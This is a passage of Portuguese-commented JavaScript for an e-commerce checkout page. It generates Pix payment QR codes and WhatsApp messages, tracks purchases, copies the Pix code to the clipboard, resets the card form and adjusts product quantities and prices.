                const qtyText = item.quantity > 1 ? ` ${item.quantity} Und` : '';
                return `${item.name}${qtyText}`;
              }).join(', ');
            } else if (typeof shpfyProductTitle === 'string' && shpfyProductTitle) {
              productDetailsText = shpfyProductTitle;
            }

            // Valor formatado em BRL
            const totalAmountVal = (responseData.data && responseData.data.amount) || parseFloat(amountInput.value) || 0;
            const totalFormatted = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalAmountVal);

            // Chave Pix Copia e Cola
            const pixCode = responseData.pix_qr_code || '';

            // Mensagem 1: Notificação de Pedido com Detalhes (usando o template dinâmico)
            const message1 = dbWaMsgPix
              .replace(/{nome}/g, firstName)
              .replace(/{loja}/g, dbWaStoreName)
              .replace(/{pedido}/g, orderNumber)
              .replace(/{produtos}/g, productDetailsText)
              .replace(/{valor}/g, totalFormatted);

            // Mensagem 2: Apenas a chave Pix copia e cola
            const message2 = pixCode;

            // Injetar URLs nos botões
            btnWhatsappMessage.href = `https://wa.me/${cleanPhone}?text=${encodeURIComponent(message1)}`;
            btnWhatsappPixKey.href = `https://wa.me/${cleanPhone}?text=${encodeURIComponent(message2)}`;
          }
          
          // Customizar instruções do Pix caso definidas
          const pixCustomInstructions = document.getElementById('pix-custom-instructions');
          if (pixCustomInstructions) {
            if (window._currentThemeConfig && window._currentThemeConfig.pixInstructions) {
              pixCustomInstructions.innerText = window._currentThemeConfig.pixInstructions;
              pixCustomInstructions.classList.remove('hide');
            } else {
              pixCustomInstructions.classList.add('hide');
            }
          }
          
          // Carregar QR Code visual
          qrLoadingSpinner.classList.add('show');
          pixQrImage.onload = () => qrLoadingSpinner.classList.remove('show');
          pixQrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&margin=20&data=${encodeURIComponent(responseData.pix_qr_code)}`;

          // Rastreamento Pix Purchase
          let subtotal = parseFloat(amountInput.value) || 0;
          let shippingPrice = 15.00;
          const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
          if (selectedRadio) {
            const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
            shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
          }
          const totalAmount = subtotal + shippingPrice;

          trackPixelEvent('Purchase', {
            content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
            currency: 'BRL',
            value: totalAmount,
            payment_method: 'pix'
          });

          // Limpar rascunho de sessão atual
          localStorage.removeItem('checkout_session_id');
        } else {
          statusTitle.textContent = 'Transação Registrada!';
          statusSubtitle.textContent = 'O rascunho de cartão foi criado e salvo no Supabase com sucesso!';
        }
      }
    } 
    else if (state === 'error') {
      statusIconBox.classList.add('error');
      statusIcon.classList.add('fa-xmark');
      statusTitle.textContent = 'Falha no Processamento';
      statusSubtitle.textContent = 'Houve um erro ao processar a requisição.';
      
      btnCloseModal.style.display = 'inline-flex';
      responseMode.textContent = 'ERRO';
      responseMode.className = 'badge error';
      
      if (responseData) {
        responseJsonPreview.textContent = JSON.stringify(responseData, null, 2);
      }
    }
  }

  // Ação de copiar código Pix Copia e Cola
  btnCopyPix.addEventListener('click', () => {
    pixCopyInput.select();
    pixCopyInput.setSelectionRange(0, 99999); // Mobile
    
    navigator.clipboard.writeText(pixCopyInput.value)
      .then(() => {
        // Feedback visual do botão
        btnCopyPix.classList.add('copied');
        copyBtnText.textContent = 'Copiado!';
        copyIcon.className = 'fa-solid fa-check';
        
        setTimeout(() => {
          btnCopyPix.classList.remove('copied');
          copyBtnText.textContent = 'Copiar';
          copyIcon.className = 'fa-regular fa-copy';
        }, 2000);
      })
      .catch(err => {
        console.error('Falha ao copiar:', err);
      });
  });

  // Fechar o modal e voltar para o domínio principal da loja
  btnCloseModal.addEventListener('click', () => {
    statusModal.classList.remove('open');
    if (window.pixPaymentPollInterval) {
      clearInterval(window.pixPaymentPollInterval);
      window.pixPaymentPollInterval = null;
    }
    
    // Redireciona para o domínio principal (página inicial da loja) de forma 100% dinâmica
    window.location.href = window.location.origin;
  });

  // Reiniciar Formulário
  function resetCheckoutForm() {
    checkoutForm.reset();
    
    sections.forEach((s, idx) => {
      s.classList.remove('completed');
      if (idx === 0) {
        s.classList.add('active');
      } else {
        s.classList.remove('active');
      }
    });

    // Forçar volta para aba de Cartão de Crédito
    paymentTabs[0].click();

    // Resetar cartão visual
    document.getElementById('card-number-view').textContent = '•••• •••• •••• ••••';
    document.getElementById('card-holder-view').textContent = 'NOME COMPLETO';
    document.getElementById('card-expiry-view').textContent = 'MM/AA';
    document.getElementById('card-cvv-view').textContent = '•••';
    detectCardBrand('');
    
    calculateTotals();
    updateTopProgressBar();
  }

  // Helper: Gerar UUID v4
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  // Lógica de quantidade interativa no checkout ativo
  document.addEventListener('click', (e) => {
    const minusBtn = e.target.closest('#checkout-qty-minus');
    const plusBtn = e.target.closest('#checkout-qty-plus');
    
    if (minusBtn || plusBtn) {
      e.preventDefault();
      const qtyValEl = document.getElementById('checkout-qty-val');
      if (!qtyValEl) return;
      
      let qty = parseInt(qtyValEl.textContent) || 1;
      if (minusBtn) {
        if (qty > 1) qty--;
      } else {
        qty++;
      }
      qtyValEl.textContent = qty;
      
      // Atualizar preço de acordo
      const urlParams = new URLSearchParams(window.location.search);
      const hasShopifyProduct = urlParams.get('title') && urlParams.get('price');
      
      const baseAmountInput = document.getElementById('base-amount');
      const prodPriceEl = document.getElementById('checkout-product-price-val');
      
      let unitPrice = 129.90;
      
      if (hasShopifyProduct) {
        unitPrice = parseFloat(urlParams.get('price')) || 0;
      } else if (window._currentThemeConfig && window._currentThemeConfig.productPrice !== undefined) {
        unitPrice = parseFloat(window._currentThemeConfig.productPrice);
      } else if (baseAmountInput) {
        // Fallback para preço unitário
        const currentTotal = parseFloat(baseAmountInput.value) || 129.90;
        const currentQty = parseInt(minusBtn ? qty + 1 : qty - 1) || 1;
        unitPrice = parseFloat((currentTotal / currentQty).toFixed(2)) || 129.90;
      }
      
      const newTotal = (unitPrice * qty).toFixed(2);
      if (baseAmountInput) {
        baseAmountInput.value = newTotal;
        baseAmountInput.dispatchEvent(new Event('input'));
      }
      
      if (prodPriceEl) {
        prodPriceEl.textContent = 'R$ ' + parseFloat(newTotal).toFixed(2).replace('.', ',');
      }
    }
  });
});
